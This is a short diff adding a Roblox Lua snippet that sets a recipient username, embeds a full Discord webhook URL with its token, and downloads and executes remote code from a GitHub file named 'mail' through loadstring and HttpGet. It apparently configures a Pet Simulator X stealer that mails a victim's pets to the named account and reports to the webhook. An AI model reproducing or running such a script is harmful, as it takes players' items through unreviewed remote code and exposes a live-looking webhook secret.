@@ -1,0 +1,5 @@
+UserName = "giogamernoobandpro" -- good pets (huges etc.)
+Webhook = "https://discord.com/api/webhooks/1189455757775736922/54QUq0J8iM9moWZRtZm5n_NUTQSjABXJTFd6ZYA3bm-P3b-WmUwELmBx1nx2VZUJQtpI" -- pings for pets
+UserName2 = "giogamernoobandpro" -- bad pets (events etc.)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Wyrlix/PSX/main/mail"))()
